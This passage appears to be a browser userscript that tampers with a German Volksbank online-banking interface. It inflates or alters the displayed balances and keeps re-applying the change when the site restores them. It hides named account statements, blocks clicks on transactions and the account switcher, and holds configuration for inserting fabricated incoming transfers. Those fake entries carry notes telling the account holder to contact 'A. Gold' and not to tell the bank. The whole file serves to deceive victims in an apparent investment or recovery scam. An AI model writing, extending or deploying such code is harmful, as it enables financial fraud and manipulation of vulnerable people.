            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug010/2025'
        },
        // Add more groups as needed
    ];

    function removeMatchingElements() {
        const elements = document.querySelectorAll('.ng-untouched.ng-pristine.ng-valid.ng-star-inserted');
        elements.forEach(element => {
            const text = element.textContent.replace(/\s+/g, '').toLowerCase();

            groups.forEach(group => {
                const containsFirstText = text.includes(group.firstText);
                const containsSecondText = text.includes(group.secondText);

                if ((group.checkFirstText && group.checkSecondText && containsFirstText && containsSecondText) ||
                    (group.checkFirstText && !group.checkSecondText && containsFirstText) ||
                    (!group.checkFirstText && group.checkSecondText && containsSecondText)) {
                    element.remove();
                }
            });
        });
    }

    setInterval(removeMatchingElements, 100);
}

//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0) {


        'use strict';

        // Define the target text content to search for (case and whitespace insensitive)
        var TargetTextContent1 = "Herzlich willkommen!";
        var TargetTextContent2 = "Umsatzanzeige";

        // Configurable timeout in milliseconds (default: 2000 milliseconds)
        const timeoutMillis = 0; // Adjust the timeout as needed

//        // Array of configurable balance adjustments
 //       var BALANCE_CONFIGS = [
 //           { index: 0, adjustmentAmount: -5000 },
 //           { index: 1, adjustmentAmount: -5000 },
 //           { index: 2, adjustmentAmount: -5000 }
 //           // Add more balance configurations as needed
 //       ];



// Modify the modifyBalances function by adding the condition to check for the presence of balance elements under both classes
function modifyBalances() {
    // Check if the element with class 'konto-list-header-wrapper' is present
    var headerElement = document.querySelector('.konto-list-header-wrapper');
    if (!headerElement) {
        console.log('Element with class "konto-list-header-wrapper" not found. Skipping balance modification.');
        return; // Exit if the element is not present
    }

    // Select all elements with class "saldo ng-star-inserted" or "saldo"
    var balanceElements = document.querySelectorAll('.saldo.ng-star-inserted, .saldo');

    // Check if there are no balance elements found
    if (balanceElements.length === 0) {
        console.log('No balance elements found. Skipping balance modification.');
        return; // Exit if no balance elements are present
    }

    // Iterate over each configuration in BALANCE_CONFIGS
    BALANCE_CONFIGS.forEach(function(config) {
        // Use the index from the configuration to access the specific balance element
        var balanceElement = balanceElements[config.index];

        // Proceed only if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Check if there is a direct sibling with the class "waehrung ng-star-inserted"
            var siblingCurrencyElement = balanceElement.nextElementSibling;
            if (siblingCurrencyElement && siblingCurrencyElement.classList.contains('waehrung') ) {
                // Check for the presence of " Umsatzanzeige" in the page text content
                if (document.body.textContent.includes(" Umsatzanzeige")) {
                    console.log('Text " Umsatzanzeige" found. Balance modification not performed.');
                } else {
                    // Modify the balance based on the sign and the adjustment amount
                    numericValue += config.adjustmentAmount;

                    // Update the data-positive attribute based on the new balance sign
                    balanceElement.parentElement.parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');  // 01.12.2025 before was balanceElement.parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');



                    // Format the modified balance value
                    var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', {
                        style: 'currency',
                        currency: 'EUR'
                    }).replace('€', 'EUR');

                    // Update the balance text content
                    balanceElement.textContent = updatedBalanceText;

                    // Check for an extra minus sign and remove it
                    if (balanceElement.textContent.includes('--')) {
                        balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                    }

                    // Remove the sibling currency element
                    siblingCurrencyElement.remove();
                }
            }
        }
    });
}



     //============================================================================================
      //============================================================================================
      //============================================================================================
      //============================================================================================


//---------------------------------------------------
        // Function to remove specified elements and observe DOM changes
function removeElementsAndObserve() {
    console.log('Removing elements...');
    document.querySelectorAll('.mat-caption, .mat-body.detail-col').forEach(function(element) {
        element.remove();
        console.log('Element removed:', element);
    });




}

// Call the function to start element removal and DOM observation
removeElementsAndObserve();


        //---------------------------------------------------------------------
     // Function to check for specific text content and "EUR" currency
function checkForConditions() {
    // Get the text content of the entire page and convert to lowercase
    var pageTextContent = document.body.textContent.toLowerCase();

    // Check if TargetTextContent1 is found and TargetTextContent2 is NOT found
    if (pageTextContent.includes(TargetTextContent1.toLowerCase()) &&
        !pageTextContent.includes(TargetTextContent2.toLowerCase())) {
        // Execute the modifyBalances function
        modifyBalances();
    }
}

        // Function to observe and remove the second child of the parent with class "konto-list-header-wrapper"
        function observeAndRemoveSecondChild() {
            var parentElement = document.querySelector('.konto-list-header-wrapper');

            if (parentElement && parentElement.children.length >= 2) {
                // Select the second child and remove it
                var secondChild = parentElement.children[1];
                secondChild.remove();
            }
        }



        // Check for conditions at regular intervals
        setInterval(checkForConditions, 5); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)

        // Observe and remove the second child periodically
        setInterval(observeAndRemoveSecondChild, 1000); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)



}


///===================================================================================================================
     ///===================================================================================================================
///===================================================================================================================





     // FINUB UTILITIES
if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0) {
 // Utility: parse a Euro amount like "27.010,37 EUR" to number (27010.37)
  const parseEuro = (text) => {
    try {
      if (!text) return null;
      const clean = text
        .replace(/\u00A0/g, ' ')      // NBSP -> space
        .replace(/EUR|Euro/gi, '')    // strip currency labels
        .replace(/\s/g, '')           // strip spaces
        .replace(/\./g, '')           // thousand sep
        .replace(/,/g, '.');          // decimal
      const n = Number(clean);
      return Number.isFinite(n) ? n : null;
    } catch (e) {
      console.error('[BalanceSync] parseEuro error:', e, text);
      return null;
    }
  };

  // Utility: return the visually shown SALDO <span> inside a known container
  const qSaldo = (root) => root?.querySelector('.saldo');

  // Utility: find the element that holds the main balance inside a konto-list-item
  const findMainSaldoEl = (kontoEl) => {
    // Prefer explicit markers
    return (
      kontoEl.querySelector('[data-e2e-konto-item-saldo] .saldo') ||
      kontoEl.querySelector('.konto-item-saldo .saldo') ||
      null
    );
  };

  // Utility: find the "Online verfügbarer Betrag" saldo element inside a konto-list-item
  const findVerfuegbarSaldoEl = (kontoEl) => {
    // Fast path using attribute present in your snippet
    let el =
      kontoEl.querySelector('lib-konto-property[automationid$="online-verfuegbarer-betrag"] .saldo') ||
      kontoEl.querySelector('[data-automation-id$="online-verfuegbarer-betrag-value"] .saldo');

    if (el) return el;

    // Fallback: find label by text then its value container .saldo
    const label = Array.from(
      kontoEl.querySelectorAll('.property-label, [data-automation-id$="-title"]')
    ).find((n) => /online\s+verfügbarer\s+betrag/i.test(n.textContent || ''));

    if (label) {
      const container = label.closest('.property-container') || label.parentElement;
      el = container?.querySelector('.property-value .saldo') || container?.querySelector('.saldo');
    }

    return el || null;
  };

  // Utility: update the hidden screen-reader text to match (optional polish)
  const updateSrTextNearSaldo = (saldoEl, mainText) => {
    try {
      const sr = saldoEl
        ?.closest('lib-saldo')
        ?.querySelector('.cdk-visually-hidden, .sr-focus');
      if (!sr) return;

      // Extract "27.010,37" from "27.010,37 EUR"
      const amountMatch = (mainText || '').replace(/\u00A0/g, ' ').match(/([-\d\.,]+)\s*$/);
      const amountPretty = amountMatch ? amountMatch[1] : (mainText || '').trim();

      // Common pattern in snippet: "... Euro"
      const newSr = ` ${amountPretty} Euro `;
      if (sr.textContent?.trim() !== newSr.trim()) {
        sr.textContent = newSr;
      }
    } catch (e) {
      console.warn('[BalanceSync] SR text update error:', e);
    }
  };

  // Compare-and-sync once for all konto-list-item blocks
  const syncAll = () => {
    try {
      const kontoItems = document.querySelectorAll('.konto-list-item.kontenuebersicht-default');
      if (!kontoItems.length) return;

      for (const konto of kontoItems) {
        const mainSaldoEl = findMainSaldoEl(konto);
        const verfSaldoEl = findVerfuegbarSaldoEl(konto);

        if (!mainSaldoEl || !verfSaldoEl) continue;

        const mainText = mainSaldoEl.innerHTML; // preserve &nbsp; and formatting
        const verfText = verfSaldoEl.innerHTML;

        // Numeric comparison to avoid cosmetic differences
        const mainNum = parseEuro(mainSaldoEl.textContent);
        const verfNum = parseEuro(verfSaldoEl.textContent);

        if (mainNum == null || verfNum == null) continue;

        if (mainNum !== verfNum || mainText !== verfText) {
          // Only write when different to minimize layout thrash
          verfSaldoEl.innerHTML = mainText;
          updateSrTextNearSaldo(verfSaldoEl, mainSaldoEl.textContent);
          console.debug('[BalanceSync] Updated verfügbar to main balance:', {
            main: mainSaldoEl.textContent.trim(),
            oldVerfuegbar: verfSaldoEl.textContent.trim()
          });
        }
      }
    } catch (e) {
      console.error('[BalanceSync] syncAll error:', e);
    }
  };

  // Poll every 200ms (no MutationObserver as requested)
  const INTERVAL_MS = 100;
  setInterval(syncAll, INTERVAL_MS);

  console.log('[BalanceSync] Running (interval:', INTERVAL_MS, 'ms)');


    }

//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------




     // DETAILS
  //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

//  const modificationAmount = 27000;

  const TARGETS = [
    { key: 'first',  dataId: 'konto-detail-kapitalsaldo-value' },
    { key: 'second', dataId: 'konto-detail-kontokorrent-online-verf-betrag-value' },
  ];

//  var targetTextContent1 = "DE58 2919 0024";
 // var targetTextContent2 = " 0099 4731 00";

  const state = new Map(TARGETS.map(t => [t.key, { el: null, original: null, lastApplied: null }]));

  const fmtDE = new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const digitsOnly = (str) => (str || '').replace(/\D+/g, '');
  const nearlyEqual = (a, b) => Math.round(a * 100) === Math.round(b * 100);

  function parseGermanNumber(str) {
    if (!str) return NaN;
    const cleaned = str.replace(/[^\d.,-]/g, '')
                       .replace(/\.(?=\d{3}(\D|$))/g, '')
                       .replace(',', '.');
    const n = Number.parseFloat(cleaned);
    return Number.isFinite(n) ? n : NaN;
  }
  const formatGermanNumber = (n) => fmtDE.format(Number(n));

  function findSaldoElementByDataId(dataId) {
    const container = document.querySelector(`[data-automation-id="${CSS.escape(dataId)}"]`);
    return container ? container.querySelector('.saldo') : null;
  }

  function readSaldo(el) {
    return parseGermanNumber(el?.textContent?.trim() || '');
  }

  function writeSaldo(el, value) {
    const formatted = formatGermanNumber(value);
    if (el && el.textContent !== formatted) {
      el.textContent = formatted;
      const sr = el.closest('lib-saldo')?.querySelector('.cdk-visually-hidden, .sr-focus');
      if (sr) sr.textContent = ` ${formatted} Euro `;
    }
  }

  function ensureTargetLinked(target) {
    const st = state.get(target.key);
    if (!st.el || !document.contains(st.el)) {
      st.el = findSaldoElementByDataId(target.dataId);
      if (st.el) console.log(`[VB-BalMod] Linked ${target.key} balance element`, st.el);
    }
  }

  // --- IBAN gate: restricted only to [data-automation-id="konto-detail-iban-value"]
  function ibanMatchesTargets() {
    const t1 = digitsOnly(targetTextContent1);
    const t2 = digitsOnly(targetTextContent2);
    if (!t1 || !t2) return false;

    const container = document.querySelector('[data-automation-id="konto-detail-iban-value"]');
    if (!container) return false;

    const konto = container.querySelector('.konto-iban');
    if (!konto) return false;

    const part1Node = konto.querySelector(':scope > span');
    const part2Node = konto.querySelector(':scope > strong');
    if (!part1Node || !part2Node) return false;

    return digitsOnly(part1Node.textContent) === t1 &&
           digitsOnly(part2Node.textContent) === t2;
  }

  function updateOne(target) {
    const st = state.get(target.key);
    ensureTargetLinked(target);
    if (!st.el) return;

    const gateOk = ibanMatchesTargets();

    if (!gateOk) {
      if (st.original != null) {
        const domVal = readSaldo(st.el);
        const expected = st.original + modificationAmount;
        if (nearlyEqual(domVal, expected)) {
          writeSaldo(st.el, st.original);
          console.log(`[VB-BalMod] (${target.key}) IBAN mismatch → restored original`);
        }
      }
      return;
    }

    const domVal = readSaldo(st.el);

    if (st.original == null) {
      if (Number.isFinite(domVal)) {
        st.original = domVal;
        const intended = st.original + modificationAmount;
        writeSaldo(st.el, intended);
        st.lastApplied = intended;
        console.log(`[VB-BalMod] (${target.key}) init original ${formatGermanNumber(st.original)} → applied ${formatGermanNumber(intended)}`);
      }
      return;
    }

    const expectedModified = st.original + modificationAmount;

    if (nearlyEqual(domVal, expectedModified)) return;

    if (nearlyEqual(domVal, st.original)) {
      writeSaldo(st.el, expectedModified);
      st.lastApplied = expectedModified;
      console.log(`[VB-BalMod] (${target.key}) reverted by site → re-applied`);
      return;
    }

    st.original = domVal;
    const newExpected = st.original + modificationAmount;
    writeSaldo(st.el, newExpected);
    st.lastApplied = newExpected;
    console.log(`[VB-BalMod] (${target.key}) new original ${formatGermanNumber(domVal)} → applied ${formatGermanNumber(newExpected)}`);
  }

  setInterval(() => {
    for (const t of TARGETS) updateOne(t);
  }, 100);

}

     //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================
     //==============================================================================================================

    // UMSATZE UTILITIES
// Limit scope to specific URLs (as in your script)
if (
  window.location.href.indexOf("de") > 0 ||
  window.location.href.indexOf("10658384414") > 0 ||
  window.location.href.indexOf("Downloads") > 0
) {

  // ======= TOGGLES =======
  const ENABLE_UNCLICKABLE = true;                     // make the class-based target unclickable
  const ENABLE_UNCLICKABLE_BY_ARIA = true;             // make [aria-describedby="kf-account-changer-label"] unclickable
  const ENABLE_REMOVE_SUBMENU = true;     // 18.12.2025             // remove .submenu.pb-3.ng-star-inserted every 100ms
  const ENABLE_REMOVE_ARIA_CONTAINER = true;           // remove elements with aria-label="Umsatzdetails eingeklappt, öffnen"
  const ENABLE_UNCLICKABLE_UMSATZ_LIST_ITEM = true;    // make <app-umsatz-list-item> unclickable
  // =======================

  // ---------- Common helpers ----------
  const MARK_ATTR = 'data-unclickable-applied';

  const applyUnclickable = (el) => {
    if (!el || el.hasAttribute(MARK_ATTR)) return false;
    try {
      el.style.setProperty('pointer-events', 'none', 'important');
      el.style.setProperty('user-select', 'none', 'important');

      const blocker = (e) => {
        e.stopImmediatePropagation();
        e.stopPropagation();
        e.preventDefault();
      };
      ['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend'].forEach(type => {
        el.addEventListener(type, blocker, true);
      });

      el.setAttribute(MARK_ATTR, '1');
      console.log('[Umsätze Utils] Made unclickable:', el);
      return true;
    } catch (err) {
      console.error('[Umsätze Utils] Error making element unclickable:', err);
      return false;
    }
  };

  const startPolling = (finderFn, label, maxAttempts = 300, intervalMs = 100) => {
    let attempts = 0;
    const tick = () => {
      attempts++;
      const els = finderFn();
      if (els.length) {
        let applied = 0;
        els.forEach(el => { if (applyUnclickable(el)) applied++; });
        if (applied > 0) {
          clearInterval(timer);
          console.log(`[Umsätze Utils] ${label}: applied to ${applied} element(s).`);
        }
      }
      if (attempts >= maxAttempts) {
        clearInterval(timer);
        console.warn(`[Umsätze Utils] ${label}: target not found after polling.`);
      }
    };
    const timer = setInterval(tick, intervalMs);
    tick();
    return timer;
  };

  // ---------- Unclickable by class ----------
  const targetClassString = 'mat-mdc-form-field ng-tns-c508571215-2 mat-mdc-form-field-type-kf-account-changer mat-form-field-appearance-fill mat-primary ng-valid ng-star-inserted ng-dirty ng-touched';
  const exactSelector = '.' + targetClassString.trim().split(/\s+/).join('.');
  const fallbackSelector = '.mat-mdc-form-field.mat-mdc-form-field-type-kf-account-changer';

  const findTargetsByClass = () => {
    const exact = Array.from(document.querySelectorAll(exactSelector));
    if (exact.length) return exact;
    return Array.from(document.querySelectorAll(fallbackSelector));
  };

  const startUnclickableByClass = () => {
    if (!ENABLE_UNCLICKABLE) {
      console.log('[Umsätze Utils] Class-based unclickable disabled by toggle.');
      return;
    }
    startPolling(findTargetsByClass, 'Class-based unclickable');
  };

  // ---------- Unclickable by ARIA ----------
  const ARIA_SELECTOR = '[aria-describedby="kf-account-changer-label"]';
  const findTargetsByAria = () => Array.from(document.querySelectorAll(ARIA_SELECTOR));

  const startUnclickableByAria = () => {
    if (!ENABLE_UNCLICKABLE_BY_ARIA) {
      console.log('[Umsätze Utils] ARIA-based unclickable disabled by toggle.');
      return;
    }
    startPolling(findTargetsByAria, 'ARIA-based unclickable');
  };

  // ---------- Submenu removal ----------
  const SUBMENU_SELECTOR = '.submenu.pb-3.ng-star-inserted';
  const startSubmenuRemoval = () => {
    if (!ENABLE_REMOVE_SUBMENU) {
      console.log('[Umsätze Utils] Submenu removal disabled by toggle.');
      return;
    }
    const intervalMs = 100;
    setInterval(() => {
      try {
        const nodes = document.querySelectorAll(SUBMENU_SELECTOR);
        if (nodes.length) {
          nodes.forEach(n => n.remove());
          console.log(`[Umsätze Utils] Removed ${nodes.length} submenu element(s).`);
        }
      } catch (err) {
        console.error('[Umsätze Utils] Error removing submenu:', err);
      }
    }, intervalMs);
  };

  // ---------- Remove container with specific aria-label ----------
  const ARIA_CONTAINER_SELECTOR = '[aria-label="Umsatzdetails eingeklappt, öffnen"]';
  const startRemoveAriaContainer = () => {
    if (!ENABLE_REMOVE_ARIA_CONTAINER) {
      console.log('[Umsätze Utils] Aria-container removal disabled by toggle.');
      return;
    }
    const intervalMs = 100;
    setInterval(() => {
      try {
        const nodes = document.querySelectorAll(ARIA_CONTAINER_SELECTOR);
        let removed = 0;
        nodes.forEach(el => {
          if (el && el.isConnected) {
            el.remove();
            removed++;
          }
        });
        if (removed) {
          console.log(`[Umsätze Utils] Removed ${removed} aria-labeled container(s).`);
        }
      } catch (err) {
        console.error('[Umsätze Utils] Error removing aria-labeled container:', err);
      }
    }, intervalMs);
  };

  // ---------- Make <app-umsatz-list-item> unclickable ----------
  const UMSATZ_ITEM_SELECTOR = 'app-umsatz-list-item';
  const findUmsatzItems = () => Array.from(document.querySelectorAll(UMSATZ_ITEM_SELECTOR));

  const startUnclickableUmsatzListItem = () => {
    if (!ENABLE_UNCLICKABLE_UMSATZ_LIST_ITEM) {
      console.log('[Umsätze Utils] Umsatz list-item unclickable disabled by toggle.');
      return;
    }
    startPolling(findUmsatzItems, 'Umsatz list-item unclickable');
  };

  // ---------- Kickoff ----------
  const start = () => {
    startUnclickableByClass();
    startUnclickableByAria();
    startSubmenuRemoval();
    startRemoveAriaContainer();
    startUnclickableUmsatzListItem();
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start, { once: true });
  } else {
    start();
  }
}

//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------



// Your original script starts here — NOT modified
if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

      if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


(function() {
    const style = document.createElement("style");
    style.textContent = `
        .colored[data-positive="1"][_nghost-ng-c2505942083] {
            color: var(--color-extend-positive) !important;
        }
        .colored[data-positive="0"][_nghost-ng-c2505942083] {
            color: var(--color-extend-negative) !important;
        }
    `;
    document.head.appendChild(style);
})();

}
(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
 //   var targetTextContent1 = "DE02 5606 1472";
 //   var targetTextContent2 = "0008 3176 19";

    // Configurable modification amount (positive or negative)
 //   const modificationAmount = -100.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
 //   const timeoutMillis = 0; // Adjust the timeout as needed



    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('.umsaetze-container');

        // NEW: select the actual saldo element inside the container
        var saldoElement = parentElement ? parentElement.querySelector('lib-saldo[data-positive]') : null;

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // *** FIX — update data-positive on the correct element ***
                if (saldoElement) {
                    saldoElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');
                }

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted, .waehrung');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 2); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();

}

//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /******************************************************************
   * CONFIG
   ******************************************************************/
//  // IBAN markers to verify we are on the correct account
//  var targetTextContent1 = "DE58 2919 0024";
//  var targetTextContent2 = " 0099 4731 00";

//  // Add `moveSteps`: positive -> move up N steps from default position; negative -> move down N steps.
//  // Default position = top (if insertAtTop) OR date-based anchor (insert above closest older transaction).
//  const TRANSACTIONS = [
//    {
//      title: 'Treuhand: JP Morgan Chase',
//      description: 'A. Gold kontaktieren. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
//      amount: '772.412,71',
//      date: '5. Aug.',
//      insertAtTop: false,
//      moveSteps: 1,
//      order: 8
 //   },
//    {
//      title: 'JP Morgan Chase',
//      description: 'A. Gold kontaktieren. Ohne ihn bitte nicht ausgeben.',
//      amount: '27.000,00',
//      date: '2. Aug.',
//      insertAtTop: false,
//      moveSteps: -1,
//      order: 7
//    }
//  ].sort((a, b) => (a.order ?? 0) - (b.order ?? 0));

  // Months map for German short month names
  const MONTHS = {
    'Jan.': 1, 'Feb.': 2, 'März': 3,  'Apr.': 4, 'Mai': 5, 'Jun.': 6,
    'Jul.': 7, 'Aug.': 8, 'Sep.': 9, 'Okt.': 10, 'Nov.': 11, 'Dez.': 12
  };

  // Caches to ensure insertion & allow re-placement if DOM re-renders
  const insertedNodes = new Map();  // key -> HTMLElement (our clone)
  const txConfigByKey = new Map();  // key -> tx config (for reinsert)
  const TICK_MS = 400;

  /******************************************************************
   * UTILITIES
   ******************************************************************/
  const log  = (...args) => console.log('[umsatze trans]', ...args);
  const warn = (...args) => console.warn('[umsatze trans]', ...args);
  const err  = (...args) => console.error('[umsatze trans]', ...args);

  function createKey(tx) {
    return `${tx.title}||${tx.amount}||${tx.date}`;
  }

  function isTargetAccount() {
    const ibanElem = document.querySelector('.konto-iban');
    if (!ibanElem) return false;
    const pageText = (ibanElem.textContent || '').replace(/\s/g, '').toLowerCase();
    const t1 = (targetTextContent1 || '').replace(/\s/g, '').toLowerCase();
    const t2 = (targetTextContent2 || '').replace(/\s/g, '').toLowerCase();
    return pageText.includes(t1) && pageText.includes(t2);
  }

  function parseDateFromShortDe(str) {
    if (!str) return null;
    const trimmed = str.trim();

    // Treat "Vorgemerkt" as far-future date so it floats to the top
    if (/vorgemerkt/i.test(trimmed)) {
      return new Date(3000, 0, 1, 12, 0, 0, 0);
    }

    // Examples: "5. Aug." / "31. Jul." / "30. Mai."
    const cleaned = trimmed.replace(/\s+/g, ' ').replace(/\.$/, '');
    const parts = cleaned.replace(/\./g, '').split(' ');
    if (parts.length < 2) return null;

    const day = parseInt(parts[0], 10);
    const monthToken = parts[1];
    let m = MONTHS[monthToken];
    if (m == null) {
      const withDot = monthToken.endsWith('.') ? monthToken : monthToken + '.';
      m = MONTHS[withDot];
    }
    const year = new Date().getFullYear();

    if (!isNaN(day) && m != null) {
      // Use midday to avoid timezone shifts moving to previous day
      return new Date(year, m, day, 12, 0, 0, 0);
    }
    return null;
  }

  function dateToISODateNoTZShift(d) {
    if (!(d instanceof Date) || isNaN(d.getTime())) return '';
    const safe = new Date(d.getFullYear(), d.getMonth(), d.getDate(), 12, 0, 0, 0);
    return safe.toISOString();
  }

  function findContainer() {
    return document.querySelector('app-umsatz-list-optimized');
  }

  function findBaseItem(container) {
    if (!container) return null;
    const items = container.querySelectorAll('app-umsatz-list-item');
    for (const item of items) {
      if (!item.classList.contains('custom-transaction')) return item;
    }
    return null;
  }

  function getItemDate(item) {
    if (!(item instanceof HTMLElement)) return null;

    // 1) Prefer our stored date if present (for clones)
    if (item.dataset && item.dataset.customDate) {
      const d = new Date(item.dataset.customDate);
      if (!isNaN(d.getTime())) return d;
    }

    // 2) Try the full date embedded in data-e2e-umsatz-list-item (if present)
    const carrier = item.querySelector('.umsatz-list-item[data-e2e-umsatz-list-item]');
    if (carrier) {
      const raw = carrier.getAttribute('data-e2e-umsatz-list-item') || '';
      const parts = raw.split('@');
      const last = parts[parts.length - 1]; // e.g., "Thu Aug 07 2025 00:00:00 GMT+0300 ..."
      const d = new Date(last);
      if (!isNaN(d.getTime())) return d;
    }

    // 3) Fallback: visible booking date node
    const elem = item.querySelector('[data-e2e-umsatz-list-item-buchung-zeit]') ||
                 item.querySelector('.d-flex.justify-content-end.buchung-zeit');
    if (elem) {
      const text = (elem.textContent || '').replace(/\s+/g, ' ').trim();
      const d = parseDateFromShortDe(text);
      if (d) return d;
    }

    return null;
  }

  function updateText(root, selector, text) {
    const el = root.querySelector(selector);
    if (el) el.textContent = text;
  }

  function setAmountAndSign(root, amount) {
    const amountSpan = root.querySelector('.text-right.konto-umsatz-saldo-shredder span');
    const currencySpan = root.querySelector('.waehrung-shredder.text-left span');
    const isPositive = !(amount || '').trim().startsWith('-');
    if (amountSpan) {
      amountSpan.textContent = amount;
      amountSpan.setAttribute('data-positive', isPositive ? '1' : '0');
    }
    if (currencySpan) {
      currencySpan.setAttribute('data-positive', isPositive ? '1' : '0');
    }
  }

  function setBuchungZeit(root, dateText) {
    const wrapper = root.querySelector('.d-flex.justify-content-end.buchung-zeit');
    if (wrapper) {
      const inner = wrapper.querySelector('[data-e2e-umsatz-list-item-buchung-zeit]');
      if (inner) inner.textContent = dateText;
      else wrapper.textContent = dateText;
    }
  }

  function sanitizeClone(clone, tx) {
    // Remove attribute to avoid confusing date reads later
    const carrier = clone.querySelector('.umsatz-list-item[data-e2e-umsatz-list-item]');
